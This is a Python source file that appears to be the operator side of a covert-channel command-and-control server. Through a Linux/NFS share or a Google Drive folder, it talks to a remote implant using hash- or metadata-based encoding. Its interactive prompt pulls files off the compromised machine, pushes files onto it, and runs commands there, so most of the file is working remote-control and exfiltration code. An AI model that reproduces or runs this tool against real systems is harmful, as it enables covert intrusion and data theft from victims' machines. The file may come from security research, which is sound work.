"""
TO DO: add upload/download capabilites
    - so easy to do
"""

import os
import sys

from src.mediums.linux_filesystem import LinuxFileSystem
from src.mediums.drive_filesystem import GoogleDriveFilesystem
from src.protocol.hash_protocol import HashProtocol
from src.protocol.metadata_protocol import MetadataProtocol

from src.utils import decode_base64, encode_base64

default_linux_path = "/home/futureleader/Research/metasploit-framework/fileshare/"
default_creds = "creds/credentials.json"
default_folder_id = "1KBwGwewMn74HOKVTZrZup3ewc-Lv_cAV"


def select_filesystem():
    print("Select filesystem:")
    print("  1) Linux / NFS (default)")
    print("  2) Google Drive")
    choice = input("Choice (default Linux/NFS): ").strip() or "1"

    if choice == "2":

        folder_id = input(f"Enter Google Drive folder ID (default: {default_folder_id}): ").strip(
        ) or default_folder_id
        fs = GoogleDriveFilesystem(default_creds, folder_id)

    else:
        path = input(f"Enter mounted Linux path (default: {default_linux_path}): ").strip(
        ) or default_linux_path
        fs = LinuxFileSystem(path)
    return fs


def select_protocol(fs):
    print("Select covert channel protocol:")
    print("  1) Hash protocol (default)")
    print("  2) Metadata protocol")
    choice = input("Choice (default Metadata): ").strip() or "1"

    if choice == "2":
        return MetadataProtocol(fs)
    
    else:
        return HashProtocol(fs)

fs = select_filesystem()
cc = select_protocol(fs)

if len(sys.argv) > 1:
    fs.set_client_count(0)

print("Waiting for connection...")
cc.wait_for_connection()


# SETUP + RUN SERVER C2
download_dir = os.path.abspath(
    os.path.join(os.getcwd(), os.pardir, "downloads"))
os.makedirs(download_dir, exist_ok=True)
while True:
    user_input = input("$ ").strip()
    if not user_input:
        continue

    # EXTRACT arguments
    cmd_name, *args = user_input.split()
    output = "Received no output"

    # DOWNLOAD
    if cmd_name == "download" and args:
        remotepath, localpath = args
        cc.write(f'download {remotepath}'.encode())
        recv_split = cc.read().split(b' ')
        if recv_split[0] == b'failed':
            output = "failed to download file!"
        else:
            decoded = decode_base64(recv_split[1])
            with open(localpath, 'wb') as fil:
                fil.write(decoded)
            output = "successfully downloaded file!"

    # UPLOAD
    elif cmd_name == "upload" and args:
        localpath, remotepath = args
        filedata = b''
        with open(localpath, 'rb') as fil:
            filedata = fil.read()
        encoded = encode_base64(filedata)
        command = b'upload ' + remotepath.encode() + b' ' + encoded
        cc.write(command)
        recv = cc.read()
        if recv == b'success':
            output = "successfully uploaded file!"
        else:
            output = "failed to upload file!"

    # EXECUTE + SPECIAL
    elif cmd_name in ["ls", "ps", "cd", "pwd", "cat", "execute"]:
        # can just send as it is
        cc.write(user_input.strip().encode())
        output = cc.read().decode()

    elif cmd_name in ("quit", "exit"):
        cc.write(user_input.encode())
        exit()

    # output the response
    print(output)